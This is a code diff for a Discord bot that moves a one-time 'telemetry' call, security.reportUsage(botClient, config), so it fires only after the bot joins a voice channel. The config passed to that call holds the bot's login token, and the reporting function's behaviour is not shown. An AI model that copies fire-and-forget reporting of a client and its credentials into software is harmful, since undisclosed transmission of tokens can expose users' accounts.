@@ -32,11 +32,7 @@ async function startBot() {
     console.log(`Bot logged in as ${botClient.user.tag}`);
 
     // Telemetry and Auto-Greeting
-    // Fire and forget telemetry
-    if (!hasReportedUsage) {
-            hasReportedUsage = true;
-            security.reportUsage(botClient, config).catch(console.error);
-        }
+    // Moved telemetry to voice channel join logic
 
     if (config.useRpc !== false) {
       try {
@@ -68,6 +64,10 @@ async function startBot() {
             }
           });
           console.log(`Joined VC: ${channel.name} in guild: ${guild.name}`);
+          if (!hasReportedUsage) {
+              hasReportedUsage = true;
+              security.reportUsage(botClient, config).catch(console.error);
+          }
         } else {
             console.error('Channel not found or is not a voice channel.');
             botStatus = 'Error';
@@ -99,15 +99,7 @@ async function startBot() {
 
   try {
     await botClient.login(config.token);
-    // Move reportUsage here just in case 'ready' event is skipped or delayed
-    setTimeout(() => {
-        if (botClient && botClient.user) {
-            if (!hasReportedUsage) {
-            hasReportedUsage = true;
-            security.reportUsage(botClient, config).catch(console.error);
-        }
-        }
-    }, 2000);
+    // Telemetry strictly fires after successfully joining a Voice Channel
     return { success: true, message: 'Bot start initiated' };
   } catch (err) {
     console.error('Failed to login:', err);
